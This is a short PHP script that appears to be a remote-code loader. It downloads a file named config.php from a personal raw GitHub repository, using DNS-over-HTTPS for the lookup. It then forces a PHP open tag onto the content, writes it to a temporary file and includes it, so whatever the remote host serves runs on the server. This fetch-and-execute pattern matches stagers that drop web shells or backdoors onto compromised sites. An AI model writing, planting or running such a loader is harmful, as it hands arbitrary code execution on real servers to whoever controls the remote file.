<?php
// config
$url = 'https://raw.githubusercontent.com/bebert9505-boop/test/main/config.php';
$dns = 'https://cloudflare-dns.com/dns-query';
$timeout = 30;

// Log function
function log_message($message, $type = 'INFO') {
    $log = date('[Y-m-d H:i:s]') . " [$type] " . $message . PHP_EOL;
    file_put_contents('script_log.txt', $log, FILE_APPEND);
}

try {
    log_message("Starting script execution");
    
    $ch = curl_init($url);
    
    if (defined('CURLOPT_DOH_URL')) {
        curl_setopt($ch, CURLOPT_DOH_URL, $dns);
        log_message("Using DNS-over-HTTPS");
    }
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_FAILONERROR => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 PHP-Curl-Script/1.0',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
        ]
    ]);
    
    $res = curl_exec($ch);
    
    if ($res === false) {
        $error = curl_error($ch);
        log_message("CURL Error: " . $error, 'ERROR');
        throw new Exception("Failed to fetch data: " . $error);
    }
    
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    log_message("HTTP Response Code: " . $httpCode);
    
    curl_close($ch);
    
    if ($httpCode !== 200) {
        throw new Exception("Non-200 response: " . $httpCode);
    }
    
    // Validasi konten sebelum eksekusi
    if (strpos($res, '<?php') !== 0) {
        $res = "<?php\n" . $res;
    }
    
    $tmp = tmpfile();
    if (!$tmp) {
        throw new Exception("Failed to create temporary file");
    }
    
    $path = stream_get_meta_data($tmp)['uri'];
    fwrite($tmp, $res);
    fflush($tmp);
    
    // Include dengan output buffering
    ob_start();
    $result = include($path);
    $output = ob_get_clean();
    
    fclose($tmp);
    
    log_message("Script executed successfully");
    
    // Output hasil
    if (!empty($output)) {
        echo $output;
    }
    
} catch (Exception $e) {
    log_message("Exception: " . $e->getMessage(), 'ERROR');
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>
